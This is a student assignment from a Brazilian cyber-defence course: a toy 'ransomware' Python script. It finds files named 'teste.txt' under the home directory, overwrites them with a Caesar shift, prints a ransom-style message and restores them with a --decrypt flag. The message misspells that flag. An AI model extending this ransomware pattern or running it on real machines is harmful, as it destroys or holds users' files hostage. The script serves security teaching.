'''

FIAP
Defesa Cibernética - 1TDCF - 2021
Development e Coding for Security
Prof. Ms. Fábio H. Cabrini
Atividade: Ransomware
Alunos
Nome: Gabriel Pionte Paulino - RM84539
Nome: Felipe Sartore Perez de Azevedo - RM: 88479

'''

import os
from sys import argv
from os.path import expanduser
from string import ascii_letters


def pArq(encrypted=False):
    for root, _, files in os.walk(expanduser("~")):
        for arq in files:
            if "teste.txt" in arq:
                print(f"|~!~| Arquivo criptografado: {arq.split('/')[-1]} |~!~|")
                crypto(os.path.join(root, arq), encrypted=encrypted)
                break


def crypto(filepath, encrypted):
    with open(filepath, "rb+") as arq:
        memorya = arq.read()
        memory = rotate(memorya, encrypted=encrypted)
        arq.seek(0)
        arq.write(memory.encode())


def rotate(content, encrypted):
    chset = ascii_letters
    if encrypted:
        caesar = str.maketrans(chset, chset[2:] + chset[:2])
        return content.decode().translate(caesar)
    print("|~!~| Seus arquivos foram criptografados, digite para descriptografar: python3 ransomware.py --decrpyt |~!~|")
    caesar = str.maketrans(chset, chset[-2:] + chset[:-2])
    return content.decode().translate(caesar)


if '--decrypt' in argv:
    pArq(encrypted=True)
    print("|~!~| Seus arquivos foram descriptografados |~!~|")
else:
    pArq()


